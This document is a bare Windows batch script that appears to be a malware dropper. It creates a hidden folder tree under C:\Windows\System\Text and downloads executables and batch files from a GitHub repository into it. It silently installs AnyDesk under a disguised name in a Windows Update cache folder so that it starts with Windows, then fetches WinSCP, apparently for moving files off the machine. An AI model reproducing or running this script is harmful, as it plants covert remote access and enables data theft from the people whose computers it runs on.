@echo off
mkdir C:\Windows\System\Text\a
mkdir C:\Windows\System\Text\a\3
mkdir C:\Windows\System\Text\a\2
mkdir C:\Windows\System\Text\a\1
mkdir C:\Windows\System\Text\b
mkdir C:\Windows\System\Text\b\3
mkdir C:\Windows\System\Text\b\2
mkdir C:\Windows\System\Text\b\1
mkdir C:\Windows\System\Text\c
mkdir C:\Windows\System\Text\c\3
mkdir C:\Windows\System\Text\c\2
mkdir C:\Windows\System\Text\c\1
mkdir C:\Windows\System\Text\d
mkdir C:\Windows\System\Text\d\3
mkdir C:\Windows\System\Text\d\2
mkdir C:\Windows\System\Text\d\1
mkdir C:\Windows\System\Text\e
mkdir C:\Windows\System\Text\e\3
mkdir C:\Windows\System\Text\e\2
mkdir C:\Windows\System\Text\e\1
mkdir C:\Windows\System\Text\f
mkdir C:\Windows\System\Text\f\3
mkdir C:\Windows\System\Text\f\2
mkdir C:\Windows\System\Text\f\1
mkdir C:\Windows\System\Text\g
mkdir C:\Windows\System\Text\g\3
mkdir C:\Windows\System\Text\g\2
mkdir C:\Windows\System\Text\g\1
mkdir C:\Windows\System\Text\h
mkdir C:\Windows\System\Text\h\3
mkdir C:\Windows\System\Text\h\2
mkdir C:\Windows\System\Text\h\3
mkdir C:\Windows\System\Text\i
mkdir C:\Windows\System\Text\i\3
mkdir C:\Windows\System\Text\i\2
mkdir C:\Windows\System\Text\i\1
mkdir C:\Windows\System\Text\j
mkdir C:\Windows\System\Text\j\3
mkdir C:\Windows\System\Text\j\2
mkdir C:\Windows\System\Text\j\1
mkdir C:\Windows\System\Text\k
mkdir C:\Windows\System\Text\k\3
mkdir C:\Windows\System\Text\k\2
mkdir C:\Windows\System\Text\k\1
mkdir C:\Windows\System\Text\l
mkdir C:\Windows\System\Text\l\3
mkdir C:\Windows\System\Text\l\2
mkdir C:\Windows\System\Text\l\1
mkdir C:\Windows\System\Text\m
mkdir C:\Windows\System\Text\m\3
mkdir C:\Windows\System\Text\m\2
mkdir C:\Windows\System\Text\m\1
mkdir C:\Windows\System\Text\n
mkdir C:\Windows\System\Text\n\3
mkdir C:\Windows\System\Text\n\2
mkdir C:\Windows\System\Text\n\1
mkdir C:\Windows\System\Text\o
mkdir C:\Windows\System\Text\o\3
mkdir C:\Windows\System\Text\o\2
mkdir C:\Windows\System\Text\o\1
mkdir C:\Windows\System\Text\p
mkdir C:\Windows\System\Text\p\3
mkdir C:\Windows\System\Text\p\2
mkdir C:\Windows\System\Text\p\1
mkdir C:\Windows\System\Text\q
mkdir C:\Windows\System\Text\q\3
mkdir C:\Windows\System\Text\q\2
mkdir C:\Windows\System\Text\q\1
mkdir C:\Windows\System\Text\r
mkdir C:\Windows\System\Text\r\3
mkdir C:\Windows\System\Text\r\2
mkdir C:\Windows\System\Text\r\1
mkdir C:\Windows\System\Text\s
mkdir C:\Windows\System\Text\s\3
mkdir C:\Windows\System\Text\s\2
mkdir C:\Windows\System\Text\s\1
mkdir C:\Windows\System\Text\t
mkdir C:\Windows\System\Text\t\3
mkdir C:\Windows\System\Text\t\2
mkdir C:\Windows\System\Text\t\1
mkdir C:\Windows\System\Text\u
mkdir C:\Windows\System\Text\u\3
mkdir C:\Windows\System\Text\u\2
mkdir C:\Windows\System\Text\u\1
mkdir C:\Windows\System\Text\v
mkdir C:\Windows\System\Text\v\3
mkdir C:\Windows\System\Text\v\2
mkdir C:\Windows\System\Text\v\1
mkdir C:\Windows\System\Text\w
mkdir C:\Windows\System\Text\w\3
mkdir C:\Windows\System\Text\w\2
mkdir C:\Windows\System\Text\w\1
mkdir C:\Windows\System\Text\x
mkdir C:\Windows\System\Text\x\3
mkdir C:\Windows\System\Text\x\2
mkdir C:\Windows\System\Text\x\1
mkdir C:\Windows\System\Text\y
mkdir C:\Windows\System\Text\y\3
mkdir C:\Windows\System\Text\y\2
mkdir C:\Windows\System\Text\y\1
mkdir C:\Windows\System\Text\z
mkdir C:\Windows\System\Text\z\3
mkdir C:\Windows\System\Text\z\2
mkdir C:\Windows\System\Text\z\1
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System\Text\r\3\accgen.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile C:\Windows\System\Text\t\3\nircmd.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System\Text\r\3\define.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System\Text\r\3\ss.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\Text\r\3\ss1.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\Text\r\3\gen.bat
powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe
C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe --install "C:\Windows\SoftwareDistribution\Download\SharedFileCache" --start-with-win --silent --update-manually
timeout 5
:scp
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\Text\r\3\scp.zip
powershell Expand-Archive C:\Windows\System\Text\r\3\scp.zip -DestinationPath C:\Windows\System\Text\r\3\
if exist "C:\Windows\System\Text\r\3\WinSCP.com" if exist "C:\Windows\System\Text\r\3\WinSCP.exe" goto end
if not exist "C:\Windows\System\Text\r\3\WinSCP.com" goto scp
if not exist "C:\Windows\System\Text\r\3\WinSCP.exe" goto scp
end:
